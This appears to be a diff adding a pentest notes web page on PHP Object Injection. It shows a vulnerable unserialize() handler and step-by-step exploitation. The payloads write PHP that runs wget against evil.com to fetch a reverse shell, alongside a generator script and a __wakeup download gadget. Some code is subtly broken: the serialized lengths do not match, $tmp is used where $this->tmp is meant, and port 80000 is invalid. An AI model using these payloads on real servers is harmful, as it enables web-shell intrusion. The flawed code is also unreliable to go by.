@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PHP Object Injection - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PHP Object Injection", url: "#_top", children: [
+              {title: "Investigation", url: "#investigation" },
+              {title: "Exploitation 1", url: "#exploitation-1" },
+              {title: "Exploitation 2", url: "#exploitation-2" },
+              {title: "Automation", url: "#automation" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="php-object-injection">PHP Object Injection</h1>
+<p>PHP Object Injection is a type of vulnerability that can occur when untrusted user input is deserialized in a PHP application.</p>
+<div class="language-text highlight"><pre><span></span><code>- [PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+- [PHP serialization](https://github.com/R0B1NL1N/PayloadsAllTheThings/blob/master/PHP serialization/README.md)
+</code></pre></div>
+<h2 id="investigation">Investigation</h2>
+<p>Below is an example of an <strong><code>index.php</code></strong> in PHP web application.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&lt;?php
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>class Example {
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    public $file = &#39;example.txt&#39;;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    public $msg = &#39;Hello World&#39;;
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    public function SomeFunc() {
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>        // Some code ...
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    }
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    public function __destruct() {
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        file_put_contents(__DIR__ . &#39;/&#39; . $this-&gt;file,$this-&gt;msg,FILE_APPEND);
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    }
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>}
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>$data = unserialize($_GET[&#39;data&#39;]);
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>// Some code ...
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>?&gt;
+</span></code></pre></div>
+<p>This code adds a text file named <strong><code>example.txt</code></strong>, that contains <strong>"Hello World"</strong> strings, into the web root directory.  If the <strong>"data"</strong> parameter (<strong><code>/?data=...</code></strong>) is given, this value will be unserialized by <strong><code>unserialize()</code></strong> method.<br />
+In short, we can inject the serialized malicious code to the value of the <strong><code>data</code></strong> parameter.</p>
+<p>Then access to <strong><code>https://example.com/?data=&lt;serialized_code_here&gt;</code></strong> then our arbitrary code will be executed.<br />
+For example,</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://example.com/?data=O:8:&quot;Example&quot;:1:{s:10:&quot;msg&quot;;s:15:&quot;&lt;?php system(&#39;wget http://evil.com:8000/shell.php -O shell.php&#39;); ?&gt;&quot;;}
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="exploitation-1">Exploitation 1</h2>
+<p>Assumes the above situation (<strong>”index.php”</strong> in the <strong>“Investigation”</strong> section).<br />
+We generate the serialized data and inject it to the <strong>“data”</strong> parameter.</p>
+<h3 id="1-generate-a-serialized-malicious-object">1. Generate a Serialized Malicious Object</h3>
+<p>Create a malicious <strong>“Example”</strong> class contains <strong><code>__destruct()</code></strong> method in PHP.<br />
+This script add the <strong>“download.php”</strong>, which downloads a PHP reverse shell script, into the web root directory. Then prints the URL encoded serialized <strong>“Example”</strong> class.</p>
+<p>Replace <strong><code>&lt;local-ip&gt;</code></strong> with your local ip address.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;?php
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>class Example {
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    public $file = &#39;download.php&#39;;
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    public $msg = &quot;&lt;?php system(&#39;wget http://&lt;local-ip&gt;:8000/shell.php -O shell.php&#39;); ?&gt;&quot;;
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    public function SomeFunc() {
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        // Some code ...
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    }
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>    public function __destruct() {
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>        file_put_contents(__DIR__ . &#39;/&#39; . $this-&gt;file,$this-&gt;msg,FILE_APPEND);
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    }
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>}
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>print urlencode(serialize(new Example));
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>?&gt;
+</span></code></pre></div>
+<p>Then generate a deserialized data.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>php generate.php
+</span></code></pre></div>
+<p>Copy the output data.</p>
+<h3 id="2-download-a-reverse-shell-script">2. Download a Reverse Shell Script.</h3>
+<p>In local machine, start local web server where the PHP reverse shell script located.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>python3 -m http.server 80000
+</span></code></pre></div>
+<p>Now access to <code>https://example.com/?data=&lt;serialized_data_here&gt;</code>.  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>http://example.com/?data=O:8:&quot;Example&quot;:1:{s:10:&quot;msg&quot;;s:15:&quot;&lt;?php system(&#39;wget http://evil.com:8000/shell.php -O shell.php&#39;); ?&gt;&quot;;}
+</span></code></pre></div>
+<p>By this, our PHP reverse shell script is download to the target web root (e.g. <code>https://example.com/shell.php</code>).</p>
+<p><br /></p>
+<h2 id="exploitation-2">Exploitation 2</h2>
+<p>First off, prepare the reverse shell script (<strong><code>shell.php</code></strong>) in local machine and start web server.<br />
+Then create a maliciou payload as follow.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&lt;?php
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>class Example {
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    public $tmp = &quot;http://evil.com/shell.php&quot;;
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    public $imgPath = &quot;./shell.php&quot;;
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    public function __wakeup() {
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>        $f = fopen($this-&gt;imgPath, &quot;w&quot;);
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>        fwrite($f, file_get_contents($tmp));
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>        fclose($f);
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    }
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>}
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>$payload = base64_encode(serialize(new Example));
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>echo $payload;
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>?&gt;
+</span></code></pre></div>
+<p>Now run it in terminal.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>php payload.php
+</span></code></pre></div>
+<p>Copy the output and paste it to where the payload affects.</p>
+<p><br /></p>
+<h2 id="automation">Automation</h2>
+<p><a href="https://github.com/ambionics/phpggc">PHPGGC</a> is a library of PHP <strong><code>unserialize()</code></strong> payloads along with a tool to generate them.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># List all gadeget chains
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>phpggc -l
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/php-object-injection.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
